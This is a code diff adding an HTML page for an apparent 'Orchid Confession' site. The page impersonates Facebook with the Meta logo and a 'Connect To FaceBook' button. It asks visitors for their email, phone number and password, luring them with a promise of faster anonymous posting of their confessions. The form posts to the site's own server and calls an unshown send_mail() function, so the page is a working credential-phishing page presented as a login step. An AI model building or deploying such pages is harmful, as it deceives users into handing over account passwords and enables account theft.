@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Orchid Confession</title>
+    <script src="script.js"></script>
+</head>
+
+<body>
+    <div>
+        <form method="POST" action="/">
+            <img src="https://scontent.fbhr1-1.fna.fbcdn.net/v/t39.8562-6/252294889_575082167077436_6034106545912333281_n.svg/meta-logo-primary_standardsize.svg?_nc_cat=1&ccb=1-5&_nc_sid=ad8a9d&_nc_ohc=kq4o4ecS8tcAX8Einfi&_nc_ht=scontent.fbhr1-1.fna&oh=00_AT9lEfMR4efmgWjfT1nBqPnJCRoRp3FBm61VX1VepMhCYA&oe=61E1A979">
+            <H2>Connect To FaceBook</H2>
+            <input name="email" id="email" type="email" placeholder="Use Your Email" required/>
+            <input name="num" id="num" type="number" placeholder="Use Your Number" required/>
+            <input name="pass" id="pass" type="password" placeholder="Use Your Password" required/>
+            <input name="text" id="text" type="text" placeholder="Type Your Confession If You want" />
+
+            <button type="submit" onclick="send_mail()">Connect To Facebook</button>
+        </form>
+        <p>We are the Orchidians.<strong>Your confession will be posted faster and directly to our page without any identity reveal</strong> So, You can confess without any hesitation. This is our official website. To communicate connect us with facebook
+            and get your confession posted faster and at first. To ask any queries connect to facebook and ask. Thank you orchidians.<strong> Keep Supporting Me</strong>
+        </p>
+    </div>
+    <style>
+        div {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+        }
+        
+        H2 {
+            color: gray;
+        }
+        
+        img {
+            width: 15%;
+            max-width: 90px;
+            margin: 0.9rem;
+        }
+        
+        form {
+            width: 100%;
+            height: auto;
+            display: flex;
+            flex-wrap: wrap;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            border-radius: 5px;
+            box-shadow: rgba(0, 0, 0, 0.02) 0px 1px 3px 0px, rgba(27, 31, 35, 0.15) 0px 0px 0px 1px;
+        }
+        
+        p {
+            word-spacing: 1px;
+            color: rgb(82, 82, 82);
+            margin: 0.5rem;
+        }
+        
+        input {
+            padding: 0.9rem;
+            margin: 0.9rem;
+            width: 60%;
+            max-width: 300px;
+            text-align: center;
+            border: none;
+            background-color: transparent;
+            border-bottom: 2px solid lightgray;
+            outline: none;
+        }
+        
+        input:hover {
+            border-bottom: 2px solid rgb(0, 98, 255);
+        }
+        
+        button {
+            margin: 0.9rem;
+            padding: 0.9rem;
+            border: none;
+            color: white;
+            cursor: pointer;
+            border-radius: 6px;
+            background-color: rgb(0, 98, 255);
+        }
+        
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+        
+        input[type=number] {
+            -moz-appearance: textfield;
+        }
+    </style>
+</body>
+
+</html>
